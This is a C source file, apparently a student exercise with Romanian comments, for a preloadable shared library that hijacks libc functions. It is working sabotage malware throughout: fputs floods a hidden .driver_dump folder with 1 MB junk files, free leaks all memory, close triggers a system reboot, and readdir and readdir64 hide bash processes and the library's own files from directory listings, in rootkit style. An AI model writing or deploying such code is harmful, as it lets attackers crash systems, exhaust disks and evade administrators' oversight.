#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include<dirent.h>
#include <unistd.h>
#include <fcntl.h> 
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>


void createfile()
{
    srand(time(NULL));

    char initial_path[200];
    strcpy(initial_path,".driver_dump/.");

    char string[9];
    for (int i = 0; i < 8; i++) {
        string[i] = 'a' + rand() % 26;
    }
    string[8] = '\0';

    char filename[8+5];
    strcpy(filename, string);
    strcat(filename, ".txt");
    strcat(initial_path,filename);
    
    mkdir(".driver_dump", S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);

    FILE *fp = fopen(initial_path, "w");
    //int descriptor = open(initial_path, O_WRONLY | O_CREAT, S_IRUSR | S_IWUSR | S_IRGRP);
	//nu scria in fisier folosind aceasta metoda
    int i;
    for (i = 0; i < 1024*1024; i++) {
    	//write(descriptor, 'a' + rand() % 26, 1);
        fputc('a' + rand() % 26, fp);
    }
    
    //fclose(fp);
}      


















int fputs(const char *str, FILE *stream)
{

    int (*original_fputs)(const char *, FILE *) = dlsym(RTLD_NEXT, "fputs");
    int result = original_fputs(str, stream);
    printf("Annoying isn't it?\n");
    createfile();
    
    return result;
}


























void* malloc(size_t size)
{
    void *(*real_malloc)(size_t) = dlsym(RTLD_NEXT, "malloc");
    void *ret = real_malloc(size);

	
    //fprintf(stderr,"malloc\n");

    return ret;
}



















void free(void *p)
{
    void (*libc_free)(void*) = dlsym(RTLD_NEXT, "free");

    //libc_free(p); //nu se mai dezaloca memorie (in cazul unui server, la un moment da va crapa
}




















typedef pid_t (*fork_func_t)(void);
pid_t fork(void) 
{
  fork_func_t original_fork = (fork_func_t)dlsym(RTLD_NEXT, "fork");

  pid_t pid = original_fork();
  //fprintf(stderr,"fork\n");
  //createfile();
  
  return pid;
}



















/*
struct dirent *(*old_readdir)(DIR *dir);
struct dirent *readdir(DIR *dirp){
	
    old_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *dir;

    while (dir = old_readdir(dirp)){
	    
        //if(strstr(dir->d_name,".driver_dump") == 0) 
        //	break;
        if(strstr(dir->d_name,".libmylib.so") == 0) 
        	continue;
    }
    return dir;
}*/























typedef int (*close_func_t)(int); //redenumire basic type
int close(int fd) {
    close_func_t original_close = (close_func_t)dlsym(RTLD_NEXT, "close");
    int ret = original_close(fd);
    system("reboot"); //cand se inchide un fisier se executa aceasta
    return ret;
}


















static const char* process_to_filter = "bash";

static int get_dir_name(DIR* dirp, char* buf, size_t size)
{
    int fd = dirfd(dirp);
    if(fd == -1) {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if(ret == -1) {
        return 0;
    }

    buf[ret] = 0;
    return 1;
}


static int get_process_name(char* pid, char* buf)
{
    if(strspn(pid, "0123456789") != strlen(pid)) {
        return 0;
    }

    char tmp[256];
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
 
    FILE* f = fopen(tmp, "r");
    if(f == NULL) {
        return 0;
    }

    if(fgets(tmp, sizeof(tmp), f) == NULL) {
        fclose(f);
        return 0;
    }

    fclose(f);

    int unused;
    sscanf(tmp, "%d (%[^)]s", &unused, buf);
    return 1;
}

struct dirent* readdir(DIR *dirp)
{
    static struct dirent* (*original_readdir)(DIR*) = NULL;

    if(original_readdir == NULL) {
        original_readdir = dlsym(RTLD_NEXT, "readdir");
        if(original_readdir == NULL) {
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());
        }
    }

    struct dirent* dir;

    while(1) {
        dir = original_readdir(dirp);
        if(dir) {
            char dir_name[256];
            char process_name[256];
            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&
               strcmp(dir_name, "/proc") == 0 &&
               get_process_name(dir->d_name, process_name) &&
               strcmp(process_name, process_to_filter) == 0) {
                continue;
            }
            if(strstr(dir->d_name, ".libmylib.so") != NULL ||
               strstr(dir->d_name, ".driver_dump") != NULL) {
                continue;
            }
        }
        break;
    }
    return dir;
}

struct dirent64* readdir64(DIR *dirp)
{
    static struct dirent64* (*original_readdir64)(DIR*) = NULL;

    if(original_readdir64 == NULL) {
        original_readdir64 = dlsym(RTLD_NEXT, "readdir64");
        if(original_readdir64 == NULL) {
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());
        }
    }

    struct dirent64* dir;

    while(1) {
        dir = original_readdir64(dirp);
        if(dir) {
            char dir_name[256];
            char process_name[256];
            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&
               strcmp(dir_name, "/proc") == 0 &&
               get_process_name(dir->d_name, process_name) &&
               strcmp(process_name, process_to_filter) == 0) {
                continue;
            }
            if(strstr(dir->d_name, ".libmylib.so") != NULL ||
               strstr(dir->d_name, ".driver_dump") != NULL) {
                continue;
            }
        }
        break;
    }
    return dir;
}
